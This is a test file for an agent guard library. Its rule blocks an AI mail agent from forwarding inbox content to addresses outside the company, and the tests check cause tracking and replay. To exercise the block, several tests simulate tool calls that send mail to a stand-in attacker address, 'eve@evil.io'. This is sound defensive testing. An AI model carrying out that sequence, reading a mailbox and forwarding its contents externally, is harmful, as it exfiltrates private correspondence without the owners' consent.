import { describe, expect, it, vi } from 'vitest';
import { createGuard, GuardBlockedError, replay, type Rule } from '../src/index.js';

// Invariant-style flow rule: mail read from the inbox must not be forwarded outside the company
const rules: Rule[] = [
  {
    id: 'no-external-forward',
    description: 'Inbox content forwarded to an address outside acme.com',
    match: { kind: 'tool_call', target: 'email.send', args: { to: '!*@acme.com' }, after: { kind: 'tool_call', target: 'email.inbox' } },
    action: 'block',
  },
];

function setup() {
  const send = vi.fn(() => ({ sent: true }));
  const guard = createGuard({ mode: 'enforce', rules });
  const trace = guard.startTrace({ agent: 'mail-bot' });
  return { guard, trace, send };
}

describe('sequence rules (after + args)', () => {
  it('blocks the second step only when the first happened earlier in the same task', async () => {
    const { trace, send } = setup();
    await trace.tool('email.send', { to: 'eve@evil.io', body: 'hi' }, send); // no inbox read yet → allowed
    await trace.tool('email.inbox', {}, () => [{ subject: 'Q3 numbers' }]);
    await trace.tool('email.send', { to: 'boss@acme.com', body: 'fwd' }, send); // internal → allowed
    await expect(trace.tool('email.send', { to: 'eve@evil.io', body: 'fwd' }, send)).rejects.toBeInstanceOf(GuardBlockedError);
    expect(send).toHaveBeenCalledTimes(2);
  });

  it('links the cause in the graph and replay reproduces the decision from stored args', async () => {
    const { guard, trace, send } = setup();
    await trace.tool('email.inbox', {}, () => []);
    await trace.tool('email.send', { to: 'eve@evil.io' }, send).catch(() => {});
    const chain = await trace.chain();
    const [, inbox, out] = chain.events;
    expect(out.decision).toMatchObject({ action: 'block', causeId: inbox.id });
    expect(chain.edges).toContainEqual(expect.objectContaining({ type: 'rule', source: inbox.id, target: out.id }));
    expect(replay(await guard.store.list(), { mode: 'enforce', rules }).changed).toEqual([]);
  });

  it('does not leak the pattern across tasks', async () => {
    const guard = createGuard({ mode: 'enforce', rules });
    await guard.startTrace({ agent: 'a' }).tool('email.inbox', {}, () => []);
    await expect(guard.startTrace({ agent: 'b' }).tool('email.send', { to: 'eve@evil.io' }, () => 1)).resolves.toBe(1);
  });
});
